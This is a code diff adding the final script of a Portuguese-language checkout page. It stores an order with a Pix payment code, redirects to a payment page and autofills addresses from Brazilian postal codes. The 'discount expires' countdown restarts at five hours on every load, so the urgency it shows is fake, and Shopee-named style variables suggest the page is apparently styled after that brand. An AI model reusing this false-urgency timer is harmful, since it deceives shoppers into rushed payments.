+        const ordem = {
+          carrinho: state.carrinho,
+          subtotal: state.subtotal,
+          desconto: state.desconto,
+          frete: state.selectedFrete,
+          total,
+          comprador: dados.comprador,
+          entrega: dados.entrega,
+          pixCode: data.pix_code,
+          transactionId: data.transaction_id,
+          expiresAt: data.expires_at,
+          criadoEm: new Date().toISOString()
+        };
+        sessionStorage.setItem('checkoutOrdem', JSON.stringify(ordem));
+
+        const qsExtra = window.location.search ? window.location.search.replace(/^\?/, '&') : '';
+        window.location.href = `payment.html?id=${encodeURIComponent(data.transaction_id)}${qsExtra}`;
+      } catch (error) {
+        if (btnComprar) { btnComprar.disabled = false; btnComprar.textContent = 'Finalizar compra'; }
+        showToast(error.message || 'Não foi possível gerar o Pix. Tente novamente.');
+      }
+    }
+
+    function iniciarContador() {
+      let segundos = 5 * 3600;
+      const span = document.getElementById('contador');
+      if (!span) return;
+      const tick = () => {
+        if (segundos <= 0) { span.textContent = 'O desconto expirou'; return; }
+        const horas = String(Math.floor(segundos / 3600)).padStart(2, '0');
+        const minutos = String(Math.floor((segundos % 3600) / 60)).padStart(2, '0');
+        const secs = String(segundos % 60).padStart(2, '0');
+        span.textContent = `O desconto expira em ${horas}:${minutos}:${secs}`;
+        segundos -= 1;
+        setTimeout(tick, 1000);
+      };
+      tick();
+    }
+
+    function formatCEP(v) {
+      const digits = String(v || '').replace(/\D/g, '').slice(0, 8);
+      return digits.length <= 5 ? digits : `${digits.slice(0, 5)}-${digits.slice(5)}`;
+    }
+
+    function onCepInput(e) {
+      const el = e.target;
+      const formatted = formatCEP(el.value);
+      if (el.value !== formatted) { el.value = formatted; }
+      if (cepLookupTimer) clearTimeout(cepLookupTimer);
+      cepLookupTimer = setTimeout(() => tryLookupCep(), 400);
+    }
+
+    async function tryLookupCep() {
+      const cepEl = document.getElementById('cep');
+      const msgEl = document.getElementById('cep-msg');
+      if (!cepEl) return;
+      const digits = cepEl.value.replace(/\D/g, '');
+      if (digits.length !== 8) { if (msgEl) { msgEl.textContent = ''; msgEl.classList.add('hidden'); } return; }
+      if (digits === lastCepLookedUp) return;
+      lastCepLookedUp = digits;
+      if (msgEl) { msgEl.textContent = 'Buscando CEP...'; msgEl.classList.remove('hidden'); msgEl.style.color = 'var(--shopee-text-light)'; }
+      try {
+        const resp = await fetch(`https://viacep.com.br/ws/${digits}/json/`, { cache: 'no-store' });
+        const data = await resp.json();
+        if (!resp.ok || data.erro) throw new Error('CEP não encontrado');
+        const set = (id, v) => { const el = document.getElementById(id); if (el) el.value = (v || '').trim(); };
+        set('endereco', data.logradouro); set('bairro', data.bairro); set('cidade', data.localidade);
+        const estadoEl = document.getElementById('estado'); if (estadoEl) estadoEl.value = (data.uf || '').trim().toUpperCase();
+        const numeroEl = document.getElementById('numero'); if (numeroEl && !numeroEl.value) numeroEl.focus();
+        if (msgEl) { msgEl.textContent = 'Endereço preenchido automaticamente.'; msgEl.style.color = '#00C853'; msgEl.classList.remove('hidden'); }
+      } catch (err) {
+        if (msgEl) { msgEl.textContent = 'CEP inválido ou não encontrado.'; msgEl.classList.remove('hidden'); msgEl.style.color = 'var(--shopee-orange)'; }
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      Tracking.firePageView();
+      loadCarrinho();
+      renderCarrinho();
+      carregarFretes();
+      iniciarContador();
+      const cepInput = document.getElementById('cep');
+      if (cepInput) { cepInput.addEventListener('input', onCepInput); cepInput.addEventListener('blur', tryLookupCep); }
+    });
+  </script>
+</body>
+
+</html>
